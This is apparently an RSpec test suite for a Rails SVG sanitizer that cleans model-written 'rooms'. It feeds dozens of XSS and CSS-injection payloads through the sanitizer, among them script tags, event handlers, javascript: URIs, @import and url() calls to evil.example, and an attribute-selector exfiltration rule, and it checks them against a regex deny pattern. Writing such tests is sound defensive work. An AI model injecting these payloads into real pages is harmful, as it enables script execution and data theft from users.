# frozen_string_literal: true

require 'rails_helper'

# Hostile rooms. A room is written by a model that reads text from the outside world, so assume the worst:
# whatever comes out of the sanitizer is put on a page, and none of it may run, load, leave, or restyle the
# page around it.
RSpec.describe RoomSanitizer, 'against hostile input' do # rubocop:disable RSpec/SpecFilePathFormat, RSpec/DescribeMethod
  let(:hooks_svg) { <<~HTML }
    <g data-open="sources" tabindex="0" aria-label="A"><rect width="1" height="1"/></g>
    <g data-open="works" tabindex="0" aria-label="B"><rect width="1" height="1"/></g>
    <g data-open="about" tabindex="0" aria-label="C"><rect width="1" height="1"/></g>
  HTML
  # Things that must never survive, whatever the way in.
  let(:danger) { %r{<script|<iframe|<object|<embed|<form|<input|<meta|<link|<base|<a[ >]|<image|<foreignobject|<animate|<set[ >/]|<handler|\son\w+\s*=|javascript:|data:text|vbscript:|@import|expression\s*\(|-moz-binding|behavior\s*:|url\(\s*["']?(?!#)}i }

  def clean(body)
    described_class.call(%(<svg viewBox="0 0 1000 625">#{hooks_svg}#{body}</svg>)).html
  end

  {
    'script tag' => '<script>alert(1)</script>',
    'script in svg namespace' => '<svg><script>alert(1)</script></svg>',
    'script with entities' => '<scr&#105;pt>alert(1)</scr&#105;pt>',
    'mixed case script' => '<ScRiPt>alert(1)</sCrIpT>',
    'script via xlink on use' => '<use xlink:href="data:image/svg+xml;base64,PHN2Zy8+#x"/>',
    'script via href on use' => '<use href="https://evil.example/s.svg#x"/>',
    'handler on a drawn shape' => '<rect onload="alert(1)" onclick="alert(2)" width="1" height="1"/>',
    'handler with odd spacing' => '<rect width="1" height="1" onmouseover = "alert(1)"/>',
    'handler with slashes' => '<rect/onclick=alert(1)/width=1 height=1/>',
    'foreignObject with html inside' => '<foreignObject><body onload="alert(1)"><iframe src="https://evil.example"></iframe></body></foreignObject>',
    'animate sets an href' => '<a><animate attributeName="href" values="javascript:alert(1)"/></a>',
    'set sets an href' => '<set attributeName="onclick" to="alert(1)"/>',
    'image with external source' => '<image href="https://evil.example/a.png" width="1" height="1"/>',
    'image with data uri' => '<image href="data:image/svg+xml;base64,AAAA" width="1" height="1"/>',
    'link element' => '<link rel="stylesheet" href="https://evil.example/a.css">',
    'meta refresh' => '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    'base element' => '<base href="https://evil.example/">',
    'form' => '<form action="https://evil.example"><input name="x"><button>go</button></form>',
    'anchor with javascript' => '<a href="javascript:alert(1)"><rect width="1" height="1"/></a>',
    'anchor with entity-hidden javascript' => '<a href="&#106;avascript:alert(1)">x</a>',
    'import in style' => '<style>@import url(https://evil.example/a.css);</style>',
    'import with string' => '<style>@import "https://evil.example/a.css";</style>',
    'escaped import' => '<style>@\\69mport "https://evil.example/a.css";</style>',
    'font face from the web' => '<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)}</style>',
    'background url' => '<style>rect{background:url(https://evil.example/a.png)}</style>',
    'escaped url function' => '<style>rect{background:u\\72l(https://evil.example/a.png)}</style>',
    'url with spaces and quotes' => %(<style>rect{background: URL( "https://evil.example/a.png" )}</style>),
    'image-set' => '<style>rect{background:image-set("https://evil.example/a.png" 1x)}</style>',
    'cursor url' => '<style>rect{cursor:url(https://evil.example/c.cur),auto}</style>',
    'list-style image' => '<style>rect{list-style:url(https://evil.example/a.png)}</style>',
    'content url' => '<style>rect::before{content:url(https://evil.example/a.png)}</style>',
    'attribute selector exfiltration' => '<style>input[value^="a"]{background:url(https://evil.example/?a)}</style>',
    'expression' => '<style>rect{width:expression(alert(1))}</style>',
    'moz binding' => '<style>rect{-moz-binding:url(https://evil.example/x.xml#x)}</style>',
    'behavior' => '<style>rect{behavior:url(x.htc)}</style>',
    'style attribute with url' => '<rect style="background:url(https://evil.example/a.png)" width="1" height="1"/>',
    'style attribute with javascript' => '<rect style="background:url(javascript:alert(1))" width="1" height="1"/>',
    'fill url to the web' => '<rect fill="url(https://evil.example/a.svg#g)" width="1" height="1"/>',
    'fill url with escapes' => '<rect fill="u&#114;l(https://evil.example/a.svg#g)" width="1" height="1"/>',
    'filter url to the web' => '<rect filter="url(https://evil.example/f.svg#f)" width="1" height="1"/>',
    'mask url to the web' => '<rect mask="url(https://evil.example/f.svg#m)" width="1" height="1"/>',
    'clip path url to the web' => '<rect clip-path="url(//evil.example/f.svg#m)" width="1" height="1"/>',
    'style closing early' => '<style>/* </style><script>alert(1)</script> */</style>',
    'comment smuggling' => '<!--><script>alert(1)</script>-->',
    'cdata' => '<![CDATA[<script>alert(1)</script>]]>',
    'math namespace' => '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    'noscript' => '<noscript><p title="</noscript><script>alert(1)</script>"></noscript>',
    'template' => '<template><script>alert(1)</script></template>',
    'xml processing instruction' => '<?xml-stylesheet href="https://evil.example/a.css"?>',
    'svg with onload at the root' => '<svg onload="alert(1)"></svg>',
    'details ontoggle' => '<details open ontoggle="alert(1)">x</details>',
    'textarea breaking out' => '<textarea></textarea><script>alert(1)</script>',
    'title breaking out' => '<title></title><script>alert(1)</script>',
    'button with formaction' => '<button formaction="https://evil.example" type="submit">x</button>',
    'iframe srcdoc' => '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    'object data' => '<object data="https://evil.example/a.swf"></object>',
    'embed' => '<embed src="https://evil.example/a.swf">',
  }.each do |name, body|
    it "removes #{name}" do
      html = clean(body)

      expect(html).to_not match(danger)
    end
  end

  it 'keeps only the drawing and its tags in the output, nothing outside the svg' do
    html = clean('</svg><script>alert(1)</script><svg>')

    expect(html).to_not include('script')
  end

  it 'cannot close the page it is placed in' do
    html = clean('</body></html><script>alert(1)</script>')

    expect(html).to_not match(%r{</body>|</html>|<script}i)
  end

  it 'cannot open a style element that swallows the bridge script after it' do
    html = clean('<style>')

    expect(Nokogiri::HTML5.fragment(html).css('style').size).to be <= 1
    document = RoomDocument.render(html, title: 'x')
    scripts = Nokogiri::HTML5.parse(document).css('script')
    expect(scripts.size).to eq 1
    expect(scripts.first.text).to eq RoomDocument::BRIDGE
  end

  it 'never lets a room hide the bridge or add a second script to the page' do
    document = RoomDocument.render(clean('<title>x</title><textarea>y</textarea><xmp>z</xmp><plaintext>w'), title: 'x')

    expect(Nokogiri::HTML5.parse(document).css('script').map(&:text)).to eq [RoomDocument::BRIDGE]
  end

  it 'keeps a hostile display name out of the starter room, as text only' do
    account = Fabricate.build(:account, username: 'evil', display_name: %("><script>alert(1)</script><svg onload="alert(1)">))

    html = described_class.call(StarterRoom.html(account, specialty_name: %("><img src=x onerror=alert(1)>))).html
    fragment = Nokogiri::HTML5.fragment(html)

    expect(fragment.css('script, img, iframe').size).to eq 0
    expect(fragment.css('*').flat_map { |node| node.attribute_nodes.map(&:name) }.grep(/\Aon/i)).to eq []
    expect(fragment.css('svg').size).to eq 1
    expect(fragment.at_css('svg')['aria-label']).to include('<script>alert(1)</script>') # shown as words, never run
  end

  it 'keeps a hostile title and language out of the page head' do
    document = RoomDocument.render(clean(''), title: %(</title><script>alert(1)</script>), lang: %("><script>alert(1)</script>))

    expect(Nokogiri::HTML5.parse(document).css('script').map(&:text)).to eq [RoomDocument::BRIDGE]
  end

  it 'refuses input that is nested far too deeply, without raising or hanging' do
    nested = ('<g>' * 5_000) + ('</g>' * 5_000)
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)

    result = described_class.call("<svg viewBox=\"0 0 1 1\">#{nested}</svg>")

    expect(Process.clock_gettime(Process::CLOCK_MONOTONIC) - started).to be < 10
    expect(result).to_not be_valid
    expect(result.html).to eq ''
  end

  it 'refuses a room nested deeper than it needs to be' do
    result = described_class.call(%(<svg viewBox="0 0 1 1">#{hooks_svg}#{'<g>' * 60}<rect width="1" height="1"/>#{'</g>' * 60}</svg>))

    expect(result.problems).to include(a_string_matching(/nested more than/))
  end

  it 'drops bytes that are not text instead of raising' do
    result = described_class.call("<svg viewBox=\"0 0 1 1\">\xFF\xFE\x00#{hooks_svg}</svg>".b)

    expect(result).to be_valid
    expect(result.html).to be_valid_encoding
  end

  it 'does not raise on input that is not a string' do
    expect(described_class.call(nil)).to_not be_valid
    expect(described_class.call(12_345)).to_not be_valid
  end
end
